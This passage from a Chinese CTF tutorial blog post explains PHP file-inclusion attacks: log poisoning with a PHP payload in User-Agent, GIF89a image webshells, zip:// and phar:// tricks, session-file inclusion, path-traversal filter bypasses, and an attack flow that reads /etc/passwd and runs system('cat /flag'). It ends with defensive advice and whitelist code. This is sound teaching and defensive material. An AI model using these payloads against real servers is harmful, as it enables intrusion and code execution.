+<h3 id="4-日志包含"><a href="#4-日志包含" class="headerlink" title="4. 日志包含"></a>4. 日志包含</h3><p>Web 服务器会把访问日志写到文件里，比如 Apache 的 <code>access.log</code>。如果日志路径可读，可以把 PHP 代码写进 <code>User-Agent</code>，再包含日志：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?file=../../../../var/log/apache2/access.log</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php system(&#x27;id&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>日志里会出现这段 User-Agent，<code>include</code> 日志文件时就会执行。日志路径因环境而异：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/log/httpd/access_log</span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line">/var/log/nginx/error.log</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-图片马-文件包含"><a href="#5-图片马-文件包含" class="headerlink" title="5. 图片马 + 文件包含"></a>5. 图片马 + 文件包含</h3><p>先上传一个“看起来是图片、里面带 PHP 代码”的文件：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;?php system(&#x27;id&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>服务器只检查文件头&#x2F;后缀，允许上传；然后用文件包含去执行它：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../uploads/avatar.jpg</span><br></pre></td></tr></table></figure>
+
+<p><code>include</code> 不关心后缀，只关心内容里有没有 <code>&lt;?php</code>。</p>
+<h3 id="6-zip-phar"><a href="#6-zip-phar" class="headerlink" title="6. zip:// &#x2F; phar://"></a>6. <code>zip://</code> &#x2F; <code>phar://</code></h3><p>上传一个 zip：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell.zip</span><br><span class="line">└── shell.php   ← &lt;?php system(&#x27;id&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://../../uploads/shell.zip#shell.php</span><br></pre></td></tr></table></figure>
+
+<p><code>phar://</code> 类似，而且可能触发反序列化：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://../../uploads/evil.phar/test</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-Session-文件包含"><a href="#7-Session-文件包含" class="headerlink" title="7. Session 文件包含"></a>7. Session 文件包含</h3><p>PHP 的 session 默认存在 <code>/tmp/sess_&lt;PHPSESSID&gt;</code>。如果能把 PHP 代码写进 session（比如用户名、留言），再包含 session 文件：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../tmp/sess_&lt;你的 PHPSESSID&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这条链需要能控制 session 内容，且知道 session 路径。</p>
+<h2 id="绕过技巧速查"><a href="#绕过技巧速查" class="headerlink" title="绕过技巧速查"></a>绕过技巧速查</h2><table>
+<thead>
+<tr>
+<th>场景</th>
+<th>绕过</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>过滤 <code>../</code></td>
+<td><code>....//</code>、<code>..././</code></td>
+<td>删一次 <code>../</code> 后剩下 <code>../</code></td>
+</tr>
+<tr>
+<td>过滤 <code>../</code></td>
+<td>URL 编码 <code>%2e%2e%2f</code></td>
+<td>服务端解码后还原</td>
+</tr>
+<tr>
+<td>过滤 <code>../</code></td>
+<td>绝对路径 <code>/etc/passwd</code></td>
+<td>有时直接可用</td>
+</tr>
+<tr>
+<td>过滤关键字</td>
+<td>大小写、双写、编码</td>
+<td>看过滤实现</td>
+</tr>
+<tr>
+<td>自动补后缀</td>
+<td><code>%00</code> 截断（PHP &lt; 5.3.4）</td>
+<td>老版本可用</td>
+</tr>
+<tr>
+<td>自动补后缀</td>
+<td><code>?</code> 截断（部分环境）</td>
+<td><code>shell.php?</code></td>
+</tr>
+<tr>
+<td>只允许特定目录</td>
+<td><code>php://filter</code> 读源码</td>
+<td>不一定要穿越</td>
+</tr>
+<tr>
+<td>RFI 关闭</td>
+<td>日志&#x2F;图片马&#x2F;zip</td>
+<td>从本地文件入手</td>
+</tr>
+</tbody></table>
+<div class="note warning"><p><code>%00</code> 截断在新版本 PHP 已经修复，不要默认它一定可用。做题时先 <code>phpinfo</code> 看版本，或者直接试别的链。</p>
+</div>
+
+<h2 id="完整流程速查"><a href="#完整流程速查" class="headerlink" title="完整流程速查"></a>完整流程速查</h2><table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>目的</th>
+<th>操作</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>找参数</td>
+<td>看 URL、表单、源码里的 <code>include</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>确认包含</td>
+<td><code>?page=index.php</code> 看是否变化</td>
+</tr>
+<tr>
+<td>3</td>
+<td>试穿越</td>
+<td><code>../../../../etc/passwd</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>读源码</td>
+<td><code>php://filter/convert.base64-encode/resource=index.php</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>找 flag&#x2F;配置</td>
+<td>读 <code>flag.php</code>、<code>config.php</code>、<code>db.php</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>找写入点</td>
+<td>上传、日志、session、缓存</td>
+</tr>
+<tr>
+<td>7</td>
+<td>执行代码</td>
+<td>图片马、日志包含、<code>php://input</code>、<code>data://</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td>拿 flag</td>
+<td><code>system(&#39;cat /flag&#39;)</code> 或读源码</td>
+</tr>
+</tbody></table>
+<h2 id="新手常见问题"><a href="#新手常见问题" class="headerlink" title="新手常见问题"></a>新手常见问题</h2><details class="note info"><summary><p><strong>Q1：<code>include</code> 和 <code>require</code> 有什么区别？</strong></p>
+</summary>
+<p>文件不存在时，<code>include</code> 发 warning 继续，<code>require</code> 直接 fatal 停止。做题时 <code>include</code> 更常见，因为页面不会直接崩。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q2：为什么 <code>?file=flag.php</code> 看不到 flag？</strong></p>
+</summary>
+<p><code>include</code> 是执行，不是显示。<code>flag.php</code> 只赋值不 <code>echo</code>，所以页面上没有 flag。用 <code>php://filter</code> 读源码。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q3：<code>php://filter</code> 为什么能读源码？</strong></p>
+</summary>
+<p>它在读取文件时先做 base64 编码，<code>include</code> 拿到的是纯文本，没有 <code>&lt;?php</code>，所以不会执行，直接输出。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q4：<code>allow_url_include</code> 和 <code>allow_url_fopen</code> 有什么区别？</strong></p>
+</summary>
+<p><code>allow_url_fopen</code> 控制 <code>file_get_contents</code>、<code>fopen</code> 等能不能打开 URL；<code>allow_url_include</code> 控制 <code>include</code>&#x2F;<code>require</code> 能不能包含 URL。RFI 需要后者为 <code>On</code>。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q5：日志包含找不到日志路径？</strong></p>
+</summary>
+<p>常见路径：<code>/var/log/apache2/access.log</code>、<code>/var/log/httpd/access_log</code>、<code>/var/log/nginx/access.log</code>。也可以读 <code>/proc/self/environ</code>、<code>/proc/self/cmdline</code> 找线索。路径因环境而异，先读 <code>/etc/passwd</code> 确认能穿越。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q6：图片马为什么能执行？</strong></p>
+</summary>
+<p><code>include</code> 只看内容里有没有 <code>&lt;?php</code>，不看后缀。图片头 <code>GIF89a</code> 只是让上传检查通过，后面的 PHP 代码才是真正执行的部分。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q7：<code>zip://</code> 的 <code>#</code> 是什么？</strong></p>
+</summary>
+<p><code>#</code> 后面是 zip 内的文件名。URL 里 <code>#</code> 会被浏览器当锚点，所以要编码成 <code>%23</code>，或者用 Burp 发包。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q8：为什么 <code>php://input</code> 没反应？</strong></p>
+</summary>
+<p>需要 <code>allow_url_include=On</code>，且请求方法&#x2F;Content-Type 要对。用 POST 发 PHP 代码，不要用 GET。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q9：<code>php://filter</code> 被过滤了怎么办？</strong></p>
+</summary>
+<p>试大小写、双写、<code>php://filter/read=...</code>、<code>convert.base64-encode</code> 的其他写法；也可以换 <code>data://</code>、日志包含、图片马。过滤器很多，黑名单很难列全。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q10：文件包含和文件上传怎么配合？</strong></p>
+</summary>
+<p>上传一个带 PHP 代码的图片&#x2F;压缩包，再用文件包含去执行它。上传负责“把文件放上去”，包含负责“让文件跑起来”。</p>
+
+</details>
+
+<h2 id="顺手聊聊怎么防"><a href="#顺手聊聊怎么防" class="headerlink" title="顺手聊聊怎么防"></a>顺手聊聊怎么防</h2><p>文件包含的根因是<strong>把用户输入当文件名</strong>。防护思路：</p>
+<table>
+<thead>
+<tr>
+<th>优先级</th>
+<th>措施</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>★★★</td>
+<td><strong>白名单映射</strong></td>
+<td><code>?page=about</code> → 固定文件，不用用户拼路径</td>
+</tr>
+<tr>
+<td>★★★</td>
+<td><strong>不要把敏感文件放在 Web 目录</strong></td>
+<td>flag、配置、备份文件移出去</td>
+</tr>
+<tr>
+<td>★★★</td>
+<td><strong><code>open_basedir</code> 限制目录</strong></td>
+<td>即使包含也只能读指定目录</td>
+</tr>
+<tr>
+<td>★★☆</td>
+<td><strong>关闭远程包含</strong></td>
+<td><code>allow_url_include=Off</code>、<code>allow_url_fopen=Off</code></td>
+</tr>
+<tr>
+<td>★★☆</td>
+<td><strong><code>realpath</code> + 前缀检查</strong></td>
+<td>解析真实路径，确认在允许目录内</td>
+</tr>
+<tr>
+<td>★★☆</td>
+<td><strong>禁用危险函数</strong></td>
+<td><code>disable_functions</code> 关掉 <code>system</code>、<code>exec</code> 等</td>
+</tr>
+<tr>
+<td>★☆☆</td>
+<td><strong>日志&#x2F;上传目录不可执行</strong></td>
+<td>降低图片马、日志包含的危害</td>
+</tr>
+<tr>
+<td>★☆☆</td>
+<td><strong>WAF &#x2F; 黑名单</strong></td>
+<td>只能提高门槛，不能作为唯一防线</td>
+</tr>
+</tbody></table>
+<p>白名单写法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pages</span> = [</span><br><span class="line">    <span class="string">&#x27;about&#x27;</span>   =&gt; <span class="keyword">__DIR__</span> . <span class="string">&#x27;/pages/about.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;contact&#x27;</span> =&gt; <span class="keyword">__DIR__</span> . <span class="string">&#x27;/pages/contact.php&#x27;</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] ?? <span class="string">&#x27;about&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$pages</span>[<span class="variable">$key</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;not found&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$pages</span>[<span class="variable">$key</span>];</span><br></pre></td></tr></table></figure>
+
+<div class="note success"><p><strong>一条原则</strong>：文件名可以是用户选的“键”，但永远不该是用户拼的“路径”。白名单 + 敏感文件移出 Web 目录 + 关闭远程包含，三件事做到，文件包含就很难成立。</p>
+</div>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"># 文件包含</a>
+              <a href="/tags/php-filter/" rel="tag"># php://filter</a>
+              <a href="/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="tag"># 伪协议</a>
+              <a href="/tags/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/" rel="tag"># 入门基础</a>
+              <a href="/tags/LFI/" rel="tag"># LFI</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/10/25/web-ctf-command-injection-pingping/" rel="prev" title="[GXYCTF2019] Ping Ping Ping：空格与关键字的双重过滤">
+                  <i class="fa fa-angle-left"></i> [GXYCTF2019] Ping Ping Ping：空格与关键字的双重过滤
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/10/30/web-ctf-file-inclusion-secret-file/" rel="next" title="[极客大挑战 2019] Secret File：源码注释、302 跳转与 php:&#x2F;&#x2F;filter">
+                  [极客大挑战 2019] Secret File：源码注释、302 跳转与 php://filter <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Quellisya</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/Quellisya" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
